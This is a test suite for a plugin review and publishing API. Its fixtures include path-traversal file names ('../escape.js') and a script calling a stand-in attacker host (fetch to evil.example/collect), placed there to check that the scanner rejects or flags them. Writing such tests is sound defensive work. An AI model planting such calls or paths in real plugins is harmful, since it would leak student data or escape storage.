import { mkdtemp, rm } from 'node:fs/promises'
import { createHash } from 'node:crypto'
import { tmpdir } from 'node:os'
import path from 'node:path'
import JSZip from 'jszip'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import type { FastifyInstance } from 'fastify'
import { buildDeveloperPlatformServer } from '../src/app.js'

function buildReviewPayload(scanRunId: string, overrides: Record<string, unknown> = {}) {
  return {
    decision: 'approve',
    reasonCode: 'clean_review',
    notes: 'Reviewer compared the reviewed artifact to the manifest, verified only declared network traffic, and captured runtime evidence.',
    reviewerId: 'reviewer-1',
    scanContext: {
      rulesetVersion: 'dp-sec-v1',
      scanRunIds: [scanRunId],
      referencedFindingRuleIds: [],
    },
    checklist: [
      { itemId: 'platform_hosting_only', status: 'pass', notes: 'Platform URL verified' },
      { itemId: 'manifest_matches_artifact', status: 'pass', notes: 'Bundle contents match manifest' },
      { itemId: 'declared_network_domains_match_observed_behavior', status: 'pass', notes: 'Observed traffic matches declared domains' },
      { itemId: 'tool_contract_matches_runtime_behavior', status: 'pass', notes: 'Tool contract matches runtime behavior' },
      { itemId: 'data_collection_and_permissions_disclosed', status: 'pass', notes: 'Data collection and permissions are disclosed' },
      { itemId: 'age_rating_and_student_safety_reviewed', status: 'pass', notes: 'Age rating is appropriate' },
      { itemId: 'security_findings_triaged', status: 'pass', notes: 'All findings triaged with no remaining blockers' },
      { itemId: 'runtime_evidence_captured', status: 'pass', notes: 'Runtime capture attached' },
    ],
    evidence: [
      {
        source: 'platform_scan',
        summary: 'Scanner recorded no unresolved blocker findings.',
        location: 'scan-run-42',
        capturedAt: '2026-04-05T18:00:00.000Z',
        findingIds: [],
      },
      {
        source: 'reviewer_runtime_capture',
        summary: 'Reviewer observed only approved behavior in a runtime session.',
        location: 's3://review-evidence/runtime-session-1',
        capturedAt: '2026-04-05T18:05:00.000Z',
        findingIds: [],
      },
    ],
    ...overrides,
  }
}

async function seedSubmittedPlugin(server: FastifyInstance, slug: string) {
  await server.inject({
    method: 'POST',
    url: '/api/v1/developer/plugins',
    payload: {
      slug,
      name: 'Dictionary Lab',
      description: 'Vocabulary helper',
    },
  })

  const createVersionResponse = await server.inject({
    method: 'POST',
    url: `/api/v1/developer/plugins/${slug}/versions`,
    payload: {
      version: '1.0.0',
      manifest: {
        pluginId: slug,
        name: 'Dictionary Lab',
        version: '1.0.0',
        description: 'Vocabulary helper',
        entrypoint: '/index.html',
        ageRating: '8+',
        collectsInput: true,
        inputFields: [{ name: 'word', required: true, kind: 'text' }],
        permissions: ['dictionary.read'],
        networkDomains: ['api.dictionary.example'],
        dataPolicyUrl: 'https://example.com/privacy',
        externalResources: [],
        sriHashes: [],
        tools: [
          {
            name: 'lookup_word',
            description: 'Look up a word',
            inputSchema: { type: 'object' },
          },
        ],
      },
    },
  })

  const version = createVersionResponse.json()

  const artifactBytes = Buffer.from('console.log("dictionary helper")', 'utf8')
  const boundary = `----chatbridge-seed-${slug}`
  const multipartBody = Buffer.concat([
    Buffer.from(
      `--${boundary}\r\n`
        + `Content-Disposition: form-data; name="artifact"; filename="${slug}.js"\r\n`
        + 'Content-Type: application/javascript\r\n\r\n',
      'utf8',
    ),
    artifactBytes,
    Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8'),
  ])

  await server.inject({
    method: 'POST',
    url: `/api/v1/developer/plugins/${slug}/versions/${version.id}/artifact`,
    headers: {
      'content-type': `multipart/form-data; boundary=${boundary}`,
    },
    payload: multipartBody,
  })

  await server.inject({
    method: 'POST',
    url: `/api/v1/developer/plugins/${slug}/versions/${version.id}/submit`,
  })

  const scanRunsResponse = await waitForCompletedScanRun(server, slug, version.id)

  return { version, scanRunsResponse }
}

async function createScanRun(server: FastifyInstance, slug: string, versionId: string, findings: Array<Record<string, unknown>> = []) {
  const response = await server.inject({
    method: 'POST',
    url: `/api/v1/admin/plugins/${slug}/versions/${versionId}/scan-runs`,
    payload: {
      rulesetVersion: 'dp-sec-v1',
      findings,
    },
  })

  if (response.statusCode !== 201) {
    return response
  }

  return waitForCompletedScanRun(server, slug, versionId, response.json().id)
}

async function waitForCompletedScanRun(server: FastifyInstance, slug: string, versionId: string, scanRunId?: string) {
  let lastResponse = await server.inject({
    method: 'GET',
    url: `/api/v1/admin/plugins/${slug}/versions/${versionId}/scan-runs`,
  })

  for (let attempt = 0; attempt < 50; attempt += 1) {
    const scanRuns = lastResponse.json()
    const targetScanRun = Array.isArray(scanRuns)
      ? (scanRunId ? scanRuns.find((entry) => entry.id === scanRunId) : scanRuns[scanRuns.length - 1])
      : null
    if (targetScanRun && ['completed', 'failed'].includes(targetScanRun.status)) {
      return lastResponse
    }

    await new Promise((resolve) => setTimeout(resolve, 10))
    lastResponse = await server.inject({
      method: 'GET',
      url: `/api/v1/admin/plugins/${slug}/versions/${versionId}/scan-runs`,
    })
  }

  return lastResponse
}

describe('developer platform HTTP API', () => {
  let tempDir: string
  let storePath: string
  let server: FastifyInstance

  beforeEach(async () => {
    tempDir = await mkdtemp(path.join(tmpdir(), 'developer-platform-server-'))
    storePath = path.join(tempDir, 'store.json')
    server = await buildDeveloperPlatformServer({ storePath, logger: false })
  })

  afterEach(async () => {
    await server.close()
    await rm(tempDir, { recursive: true, force: true })
  })

  it('approves first, then publishes through an explicit platform publish step', async () => {
    const { version, scanRunsResponse } = await seedSubmittedPlugin(server, 'dictionary-lab')
    expect(scanRunsResponse.statusCode).toBe(200)
    const [scanRun] = scanRunsResponse.json()

    const approveResponse = await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/dictionary-lab/versions/${version.id}/review-decisions`,
      payload: buildReviewPayload(scanRun.id),
    })
    expect(approveResponse.statusCode).toBe(200)
    expect(approveResponse.json()).toEqual(
      expect.objectContaining({
        version: expect.objectContaining({
          status: 'approved',
        }),
        decision: expect.objectContaining({
          decision: 'approve',
          reasonCode: 'clean_review',
          outcome: 'approved',
        }),
      }),
    )

    const unpublishedRegistryResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/apps',
    })
    expect(unpublishedRegistryResponse.statusCode).toBe(200)
    expect(unpublishedRegistryResponse.json()).toEqual({ apps: [] })

    const publishResponse = await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/dictionary-lab/versions/${version.id}/publish`,
    })
    expect(publishResponse.statusCode).toBe(200)
    expect(publishResponse.json()).toEqual(
      expect.objectContaining({
        status: 'published',
        publishMetadata: expect.objectContaining({
          hostedUrl: 'https://plugins.chatbridge.app/dictionary-lab/v1.0.0/',
        }),
      }),
    )

    const registryAppsResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/apps',
    })
    expect(registryAppsResponse.statusCode).toBe(200)
    expect(registryAppsResponse.json()).toEqual({
      apps: [
        expect.objectContaining({
          pluginId: 'dictionary-lab',
          version: '1.0.0',
          trustTier: 'reviewed',
          status: 'approved',
          hostedUrl: 'https://plugins.chatbridge.app/dictionary-lab/v1.0.0/',
          enabled: true,
        }),
      ],
    })

    const auditResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/admin/plugins/dictionary-lab/audit',
    })
    expect(auditResponse.statusCode).toBe(200)
    expect(auditResponse.json()).toEqual(
      expect.objectContaining({
        pluginId: 'dictionary-lab',
        reviewDecisions: [
          expect.objectContaining({
            decision: 'approve',
            reasonCode: 'clean_review',
          }),
        ],
      }),
    )
  })

  it('returns field-level validation errors for invalid manifest shapes', async () => {
    const createPluginResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins',
      payload: {
        slug: 'invalid-manifest-lab',
        name: 'Invalid Manifest Lab',
        description: 'Validation test plugin',
      },
    })
    expect(createPluginResponse.statusCode).toBe(201)

    const response = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/invalid-manifest-lab/versions',
      payload: {
        version: '1.0.0',
        manifest: {
          pluginId: 'invalid-manifest-lab',
          name: 'Invalid Manifest Lab',
          version: '1.0.0',
          description: 'Validation test plugin',
          entrypoint: 'https://example.com/hosted/index.html?x=1',
          ageRating: '8+',
          collectsInput: false,
          inputFields: [{ name: 'word', required: true, kind: 'text' }],
          permissions: ['dictionary.read'],
          networkDomains: ['https://api.dictionary.example/path'],
          dataPolicyUrl: 'not-a-url',
          externalResources: [],
          sriHashes: [],
          tools: [],
        },
      },
    })

    expect(response.statusCode).toBe(422)
    expect(response.json()).toEqual({
      error: 'validation_failed',
      details: expect.arrayContaining([
        expect.objectContaining({ path: ['manifest', 'entrypoint'] }),
        expect.objectContaining({ path: ['manifest', 'inputFields'] }),
        expect.objectContaining({ path: ['manifest', 'networkDomains', 0] }),
        expect.objectContaining({ path: ['manifest', 'dataPolicyUrl'] }),
        expect.objectContaining({ path: ['manifest', 'tools'] }),
      ]),
    })
  })

  it('rejects duplicate tool names and duplicate input field names in a manifest', async () => {
    const createPluginResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins',
      payload: {
        slug: 'duplicate-manifest-lab',
        name: 'Duplicate Manifest Lab',
        description: 'Duplicate validation plugin',
      },
    })
    expect(createPluginResponse.statusCode).toBe(201)

    const response = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/duplicate-manifest-lab/versions',
      payload: {
        version: '1.0.0',
        manifest: {
          pluginId: 'duplicate-manifest-lab',
          name: 'Duplicate Manifest Lab',
          version: '1.0.0',
          description: 'Duplicate validation plugin',
          entrypoint: '/index.html',
          ageRating: '8+',
          collectsInput: true,
          inputFields: [
            { name: 'word', required: true, kind: 'text' },
            { name: 'word', required: false, kind: 'text' },
          ],
          permissions: ['dictionary.read'],
          networkDomains: ['api.dictionary.example'],
          dataPolicyUrl: 'https://example.com/privacy',
          externalResources: [],
          sriHashes: [],
          tools: [
            {
              name: 'lookup_word',
              description: 'Look up a word',
              inputSchema: { type: 'object' },
            },
            {
              name: 'lookup_word',
              description: 'Look up a second word',
              inputSchema: { type: 'object' },
            },
          ],
        },
      },
    })

    expect(response.statusCode).toBe(422)
    expect(response.json()).toEqual({
      error: 'validation_failed',
      details: expect.arrayContaining([
        expect.objectContaining({ path: ['manifest', 'inputFields', 1, 'name'] }),
        expect.objectContaining({ path: ['manifest', 'tools', 1, 'name'] }),
      ]),
    })
  })

  it('rejects version creation when manifest.pluginId does not match the plugin slug', async () => {
    const createPluginResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins',
      payload: {
        slug: 'dictionary-lab',
        name: 'Dictionary Lab',
        description: 'Vocabulary helper',
      },
    })
    expect(createPluginResponse.statusCode).toBe(201)

    const response = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/dictionary-lab/versions',
      payload: {
        version: '1.0.0',
        manifest: {
          pluginId: 'other-plugin',
          name: 'Dictionary Lab',
          version: '1.0.0',
          description: 'Vocabulary helper',
          entrypoint: '/index.html',
          ageRating: '8+',
          collectsInput: true,
          inputFields: [{ name: 'word', required: true, kind: 'text' }],
          permissions: ['dictionary.read'],
          networkDomains: ['api.dictionary.example'],
          dataPolicyUrl: 'https://example.com/privacy',
          externalResources: [],
          sriHashes: [],
          tools: [
            {
              name: 'lookup_word',
              description: 'Look up a word',
              inputSchema: { type: 'object' },
            },
          ],
        },
      },
    })

    expect(response.statusCode).toBe(422)
    expect(response.json()).toEqual({
      error: 'manifest_plugin_id_mismatch:dictionary-lab:other-plugin',
    })
  })

  it('returns runtime registry apps and flattened tool manifest for approved platform-hosted plugins', async () => {
    const { version } = await seedSubmittedPlugin(server, 'runtime-registry-lab')
    const scanRunResponse = await createScanRun(server, 'runtime-registry-lab', version.id)
    const scanRun = scanRunResponse.json().find((entry: any) => entry.pluginVersionId === version.id)

    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/runtime-registry-lab/versions/${version.id}/review-decisions`,
      payload: buildReviewPayload(scanRun.id),
    })

    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/runtime-registry-lab/versions/${version.id}/publish`,
    })

    const appsResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/apps?districtId=550e8400-e29b-41d4-a716-446655440000&classroomId=550e8400-e29b-41d4-a716-446655440001',
    })
    expect(appsResponse.statusCode).toBe(200)
    expect(appsResponse.json()).toEqual({
      apps: [
        expect.objectContaining({
          pluginId: 'runtime-registry-lab',
          hostedUrl: 'https://plugins.chatbridge.app/runtime-registry-lab/v1.0.0/',
          enabled: true,
          tools: [
            expect.objectContaining({
              name: 'lookup_word',
            }),
          ],
        }),
      ],
    })

    const toolManifestResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/tool-manifest?districtId=550e8400-e29b-41d4-a716-446655440000',
    })
    expect(toolManifestResponse.statusCode).toBe(200)
    expect(toolManifestResponse.json()).toEqual({
      tools: [
        expect.objectContaining({
          pluginId: 'runtime-registry-lab',
          pluginName: 'Dictionary Lab',
          version: '1.0.0',
          hostedUrl: 'https://plugins.chatbridge.app/runtime-registry-lab/v1.0.0/',
          tool: expect.objectContaining({
            name: 'lookup_word',
          }),
        }),
      ],
    })
  })

  it('filters non-approved runtime entries out of the registry surface', async () => {
    await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins',
      payload: {
        slug: 'draft-runtime-hidden',
        name: 'Draft Runtime Hidden',
        description: 'Should not appear in registry',
      },
    })

    await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/draft-runtime-hidden/versions',
      payload: {
        version: '0.1.0',
        manifest: {
          pluginId: 'draft-runtime-hidden',
          name: 'Draft Runtime Hidden',
          version: '0.1.0',
          description: 'Should not appear in registry',
          entrypoint: '/index.html',
          ageRating: '8+',
          collectsInput: false,
          inputFields: [],
          permissions: [],
          networkDomains: [],
          dataPolicyUrl: 'https://example.com/privacy',
          externalResources: [],
          sriHashes: [],
          tools: [
            {
              name: 'hidden_tool',
              description: 'Should stay hidden',
              inputSchema: { type: 'object' },
            },
          ],
        },
      },
    })

    const appsResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/apps',
    })
    expect(appsResponse.statusCode).toBe(200)
    expect(appsResponse.json()).toEqual({ apps: [] })

    const toolManifestResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/tool-manifest',
    })
    expect(toolManifestResponse.statusCode).toBe(200)
    expect(toolManifestResponse.json()).toEqual({ tools: [] })
  })

  it('honors district-level disable overrides in the runtime registry surface', async () => {
    const { version, scanRunsResponse } = await seedSubmittedPlugin(server, 'district-runtime-lab')
    const [scanRun] = scanRunsResponse.json()

    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/district-runtime-lab/versions/${version.id}/review-decisions`,
      payload: buildReviewPayload(scanRun.id),
    })
    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/district-runtime-lab/versions/${version.id}/publish`,
    })

    const districtId = '550e8400-e29b-41d4-a716-4466554400aa'
    const enabledResponse = await server.inject({
      method: 'GET',
      url: `/api/v1/registry/apps?districtId=${districtId}`,
    })
    expect(enabledResponse.statusCode).toBe(200)
    expect(enabledResponse.json()).toEqual({
      apps: [
        expect.objectContaining({
          pluginId: 'district-runtime-lab',
        }),
      ],
    })

    const overrideResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/admin/district-plugin-overrides',
      payload: {
        districtId,
        pluginId: 'district-runtime-lab',
        enabled: false,
      },
    })
    expect(overrideResponse.statusCode).toBe(200)

    const disabledResponse = await server.inject({
      method: 'GET',
      url: `/api/v1/registry/apps?districtId=${districtId}`,
    })
    expect(disabledResponse.statusCode).toBe(200)
    expect(disabledResponse.json()).toEqual({ apps: [] })
  })

  it('rejects approval attempts that rely only on developer-provided statements as proof', async () => {
    const { version, scanRunsResponse } = await seedSubmittedPlugin(server, 'developer-claims-only')
    const [scanRun] = scanRunsResponse.json()

    const response = await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/developer-claims-only/versions/${version.id}/review-decisions`,
      payload: buildReviewPayload(scanRun.id, {
        evidence: [
          {
            source: 'developer_submission',
            summary: 'Developer says the bundle is safe and matches the manifest.',
            location: 'developer-upload-note',
            capturedAt: '2026-04-05T18:10:00.000Z',
            findingIds: [],
          },
        ],
      }),
    })

    expect(response.statusCode).toBe(422)
    expect(response.json()).toEqual(
      expect.objectContaining({
        error: 'validation_failed',
        details: expect.arrayContaining([
          expect.objectContaining({
            path: ['evidence'],
          }),
        ]),
      }),
    )
  })

  it('requires explicit waiver metadata when a reviewer waives a checklist failure', async () => {
    const { version, scanRunsResponse } = await seedSubmittedPlugin(server, 'waiver-lab')
    const [scanRun] = scanRunsResponse.json()

    const response = await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/waiver-lab/versions/${version.id}/review-decisions`,
      payload: buildReviewPayload(scanRun.id, {
        decision: 'waive',
        reasonCode: 'student_safety_risk',
        checklist: buildReviewPayload(scanRun.id).checklist.map((item: any) =>
          item.itemId === 'age_rating_and_student_safety_reviewed'
            ? { ...item, status: 'waived', notes: 'Needs limited pilot waiver' }
            : item
        ),
        waiver: undefined,
      }),
    })

    expect(response.statusCode).toBe(422)
    expect(response.json()).toEqual(
      expect.objectContaining({
        error: 'validation_failed',
        details: expect.arrayContaining([
          expect.objectContaining({
            path: ['waiver'],
          }),
        ]),
      }),
    )
  })

  it('keeps escalated plugins out of the registry and records the escalation path', async () => {
    const { version, scanRunsResponse } = await seedSubmittedPlugin(server, 'escalation-lab')
    const [scanRun] = scanRunsResponse.json()

    const decisionResponse = await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/escalation-lab/versions/${version.id}/review-decisions`,
      payload: buildReviewPayload(scanRun.id, {
        decision: 'escalate',
        reasonCode: 'needs_security_escalation',
        notes: 'Obfuscated initialization and undeclared network traffic require a security escalation before approval.',
        escalation: {
          path: 'security',
          severity: 'critical',
          summary: 'Obfuscated initialization and undeclared network traffic require specialist review.',
          blocking: true,
        },
      }),
    })
    expect(decisionResponse.statusCode).toBe(200)
    expect(decisionResponse.json().decision).toEqual(
      expect.objectContaining({
        decision: 'escalate',
        outcome: 'escalated',
      }),
    )

    const registryResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/apps/escalation-lab',
    })
    expect(registryResponse.statusCode).toBe(404)

    const auditResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/admin/plugins/escalation-lab/audit',
    })
    expect(auditResponse.statusCode).toBe(200)
    expect(auditResponse.json().reviewDecisions[0]).toEqual(
      expect.objectContaining({
        decision: 'escalate',
        escalation: expect.objectContaining({
          path: 'security',
        }),
      }),
    )
  })

  it('can roll runtime back to a previously approved published version', async () => {
    const first = await seedSubmittedPlugin(server, 'rollback-lab')
    const [firstScanRun] = first.scanRunsResponse.json()
    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/rollback-lab/versions/${first.version.id}/review-decisions`,
      payload: buildReviewPayload(firstScanRun.id),
    })
    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/rollback-lab/versions/${first.version.id}/publish`,
    })

    const secondVersionResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/rollback-lab/versions',
      payload: {
        version: '1.1.0',
        manifest: {
          pluginId: 'rollback-lab',
          name: 'Dictionary Lab',
          version: '1.1.0',
          description: 'Vocabulary helper',
          entrypoint: '/index.html',
          ageRating: '8+',
          collectsInput: true,
          inputFields: [{ name: 'word', required: true, kind: 'text' }],
          permissions: ['dictionary.read'],
          networkDomains: ['api.dictionary.example'],
          dataPolicyUrl: 'https://example.com/privacy',
          externalResources: [],
          sriHashes: [],
          tools: [
            {
              name: 'lookup_word',
              description: 'Look up a word',
              inputSchema: { type: 'object' },
            },
          ],
        },
      },
    })
    const secondVersion = secondVersionResponse.json()
    const artifactBytes = Buffer.from('console.log("dictionary helper v2")', 'utf8')
    const boundary = '----chatbridge-rollback-v2'
    const multipartBody = Buffer.concat([
      Buffer.from(
        `--${boundary}\r\n`
          + 'Content-Disposition: form-data; name="artifact"; filename="rollback-lab-v2.js"\r\n'
          + 'Content-Type: application/javascript\r\n\r\n',
        'utf8',
      ),
      artifactBytes,
      Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8'),
    ])
    await server.inject({
      method: 'POST',
      url: `/api/v1/developer/plugins/rollback-lab/versions/${secondVersion.id}/artifact`,
      headers: {
        'content-type': `multipart/form-data; boundary=${boundary}`,
      },
      payload: multipartBody,
    })
    await server.inject({
      method: 'POST',
      url: `/api/v1/developer/plugins/rollback-lab/versions/${secondVersion.id}/submit`,
    })
    const secondScanRunsResponse = await waitForCompletedScanRun(server, 'rollback-lab', secondVersion.id)
    const [secondScanRun] = secondScanRunsResponse.json()
    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/rollback-lab/versions/${secondVersion.id}/review-decisions`,
      payload: buildReviewPayload(secondScanRun.id),
    })
    await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/rollback-lab/versions/${secondVersion.id}/publish`,
    })

    const currentVersionResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/apps/rollback-lab/version',
    })
    expect(currentVersionResponse.json()).toEqual(
      expect.objectContaining({
        activeVersion: '1.1.0',
      }),
    )

    const rollbackResponse = await server.inject({
      method: 'POST',
      url: `/api/v1/admin/plugins/rollback-lab/rollback`,
      payload: {
        targetVersionId: first.version.id,
      },
    })
    expect(rollbackResponse.statusCode).toBe(200)
    expect(rollbackResponse.json()).toEqual(
      expect.objectContaining({
        status: 'published',
        publishMetadata: expect.objectContaining({
          version: '1.0.0',
        }),
      }),
    )

    const rolledBackVersionResponse = await server.inject({
      method: 'GET',
      url: '/api/v1/registry/apps/rollback-lab/version',
    })
    expect(rolledBackVersionResponse.json()).toEqual(
      expect.objectContaining({
        activeVersion: '1.0.0',
      }),
    )
  })

  it('publishes the reviewer rubric, proof standard, and escalation paths for repeatable decisions', async () => {
    const response = await server.inject({
      method: 'GET',
      url: '/api/v1/admin/review-rubric',
    })

    expect(response.statusCode).toBe(200)
    expect(response.json()).toEqual(
      expect.objectContaining({
        checklist: expect.arrayContaining([
          expect.objectContaining({
            itemId: 'platform_hosting_only',
            hardBlockOnFail: true,
          }),
        ]),
        proofRequirements: expect.arrayContaining([
          expect.stringContaining('platform-generated'),
        ]),
        insufficientProofExamples: expect.arrayContaining([
          expect.stringContaining('Developer statement'),
        ]),
        escalationPaths: expect.arrayContaining([
          expect.objectContaining({
            path: 'security',
          }),
        ]),
      }),
    )
  })

  it('accepts multipart artifact uploads and derives immutable metadata server-side', async () => {
    await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins',
      payload: {
        slug: 'artifact-lab',
        name: 'Artifact Lab',
        description: 'Artifact upload verification',
      },
    })

    const createVersionResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/artifact-lab/versions',
      payload: {
        version: '1.0.0',
        manifest: {
          pluginId: 'artifact-lab',
          name: 'Artifact Lab',
          version: '1.0.0',
          description: 'Artifact upload verification',
          entrypoint: '/index.html',
          ageRating: '8+',
          collectsInput: false,
          inputFields: [],
          permissions: [],
          networkDomains: [],
          dataPolicyUrl: 'https://example.com/privacy',
          externalResources: [],
          sriHashes: [],
          tools: [
            {
              name: 'artifact_tool',
              description: 'Artifact flow',
              inputSchema: { type: 'object' },
            },
          ],
        },
      },
    })
    expect(createVersionResponse.statusCode).toBe(201)
    const version = createVersionResponse.json()

    const fileBytes = Buffer.from('zip payload from multipart upload', 'utf8')
    const boundary = '----chatbridge-artifact-boundary'
    const multipartBody = Buffer.concat([
      Buffer.from(
        `--${boundary}\r\n`
          + 'Content-Disposition: form-data; name="artifact"; filename="../artifact-lab.zip"\r\n'
          + 'Content-Type: application/zip\r\n\r\n',
        'utf8',
      ),
      fileBytes,
      Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8'),
    ])

    const uploadResponse = await server.inject({
      method: 'POST',
      url: `/api/v1/developer/plugins/artifact-lab/versions/${version.id}/artifact`,
      headers: {
        'content-type': `multipart/form-data; boundary=${boundary}`,
      },
      payload: multipartBody,
    })

    expect(uploadResponse.statusCode).toBe(201)
    expect(uploadResponse.json()).toEqual(
      expect.objectContaining({
        fileName: 'artifact-lab.zip',
        contentType: 'application/zip',
        sizeBytes: fileBytes.byteLength,
        sha256: createHash('sha256').update(fileBytes).digest('hex'),
        storageKey: expect.stringContaining('artifact-lab'),
      }),
    )

    const inventoryResponse = await server.inject({
      method: 'GET',
      url: `/api/v1/admin/plugins/artifact-lab/versions/${version.id}/artifact-inventory`,
    })
    expect(inventoryResponse.statusCode).toBe(200)
    expect(inventoryResponse.json()).toEqual({
      fileCount: 1,
      totalUncompressedBytes: fileBytes.byteLength,
      entries: [
        expect.objectContaining({
          path: 'artifact-lab.zip',
          sizeBytes: fileBytes.byteLength,
        }),
      ],
    })
  })

  it('rejects unsafe zip artifact contents before inventory is persisted', async () => {
    await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins',
      payload: {
        slug: 'unsafe-artifact',
        name: 'Unsafe Artifact',
        description: 'Unsafe artifact upload verification',
      },
    })

    const createVersionResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/unsafe-artifact/versions',
      payload: {
        version: '1.0.0',
        manifest: {
          pluginId: 'unsafe-artifact',
          name: 'Unsafe Artifact',
          version: '1.0.0',
          description: 'Unsafe artifact upload verification',
          entrypoint: '/index.html',
          ageRating: '8+',
          collectsInput: false,
          inputFields: [],
          permissions: [],
          networkDomains: [],
          dataPolicyUrl: 'https://example.com/privacy',
          externalResources: [],
          sriHashes: [],
          tools: [
            {
              name: 'unsafe_tool',
              description: 'Unsafe artifact flow',
              inputSchema: { type: 'object' },
            },
          ],
        },
      },
    })
    const version = createVersionResponse.json()

    const zip = new JSZip()
    zip.file('../escape.js', 'alert("bad")')
    const zipBytes = Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }))
    const boundary = '----chatbridge-unsafe-boundary'
    const multipartBody = Buffer.concat([
      Buffer.from(
        `--${boundary}\r\n`
          + 'Content-Disposition: form-data; name="artifact"; filename="unsafe-artifact.zip"\r\n'
          + 'Content-Type: application/zip\r\n\r\n',
        'utf8',
      ),
      zipBytes,
      Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8'),
    ])

    const uploadResponse = await server.inject({
      method: 'POST',
      url: `/api/v1/developer/plugins/unsafe-artifact/versions/${version.id}/artifact`,
      headers: {
        'content-type': `multipart/form-data; boundary=${boundary}`,
      },
      payload: multipartBody,
    })

    expect(uploadResponse.statusCode).toBe(400)
    expect(uploadResponse.json()).toEqual({
      error: 'artifact_inventory_unsafe_path:unsafe-artifact',
    })
  })

  it('exposes manifest-to-artifact policy verification findings for reviewer inspection', async () => {
    await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins',
      payload: {
        slug: 'verify-lab',
        name: 'Verify Lab',
        description: 'Manifest policy verification',
      },
    })

    const createVersionResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/verify-lab/versions',
      payload: {
        version: '1.0.0',
        manifest: {
          pluginId: 'verify-lab',
          name: 'Verify Lab',
          version: '1.0.0',
          description: 'Manifest policy verification',
          entrypoint: '/index.html',
          ageRating: '8+',
          collectsInput: false,
          inputFields: [],
          permissions: [],
          networkDomains: ['api.allowed.example'],
          dataPolicyUrl: 'https://example.com/privacy',
          externalResources: [],
          sriHashes: [],
          tools: [
            {
              name: 'verify_tool',
              description: 'Policy verification flow',
              inputSchema: { type: 'object' },
            },
          ],
        },
      },
    })
    const version = createVersionResponse.json()

    const zip = new JSZip()
    zip.file(
      'index.html',
      '<html><body><input name="student_name" /><img src="https://images.example.com/pixel.png" /></body></html>',
    )
    zip.file('assets/main.js', 'fetch("https://evil.example/collect")')
    const zipBytes = Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }))
    const boundary = '----chatbridge-verify-boundary'
    const multipartBody = Buffer.concat([
      Buffer.from(
        `--${boundary}\r\n`
          + 'Content-Disposition: form-data; name="artifact"; filename="verify-lab.zip"\r\n'
          + 'Content-Type: application/zip\r\n\r\n',
        'utf8',
      ),
      zipBytes,
      Buffer.from(`\r\n--${boundary}--\r\n`, 'utf8'),
    ])

    const uploadResponse = await server.inject({
      method: 'POST',
      url: `/api/v1/developer/plugins/verify-lab/versions/${version.id}/artifact`,
      headers: {
        'content-type': `multipart/form-data; boundary=${boundary}`,
      },
      payload: multipartBody,
    })
    expect(uploadResponse.statusCode).toBe(201)

    const verificationResponse = await server.inject({
      method: 'GET',
      url: `/api/v1/admin/plugins/verify-lab/versions/${version.id}/policy-verification`,
    })

    expect(verificationResponse.statusCode).toBe(200)
    expect(verificationResponse.json()).toEqual(
      expect.objectContaining({
        observedNetworkDomains: expect.arrayContaining(['evil.example', 'images.example.com']),
        findings: expect.arrayContaining([
          expect.objectContaining({
            ruleId: 'network-undeclared-domain',
            disposition: 'fail',
          }),
          expect.objectContaining({
            code: 'INPUT-UNDECLARED',
            disposition: 'fail',
          }),
        ]),
      }),
    )
  })

  it('reports undeclared external resources and undeclared input field identifiers over HTTP', async () => {
    await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins',
      payload: {
        slug: 'verify-fields-lab',
        name: 'Verify Fields Lab',
        description: 'Manifest field verification',
      },
    })

    const createVersionResponse = await server.inject({
      method: 'POST',
      url: '/api/v1/developer/plugins/verify-fields-lab/versions',
      payload: {
        version: '1.0.0',
        manifest: {
          pluginId: 'verify-fields-lab',
          name: 'Verify Fields Lab',
          version: '1.0.0',
          description: 'Manifest field verification',
          entrypoint: '/index.html',
          ageRating: '8+',
          collectsInput: true,
          inputFields: [{ name: 'search_query', required: true, kind: 'text' }],
          permissions: [],
          networkDomains: [],
          dataPolicyUrl: 'https://example.com/privacy',
          externalResources: ['https://cdn.allowed.example/app.js'],
          sriHashes: [],
          tools: [
            {
              name: 'verify_fields_tool',
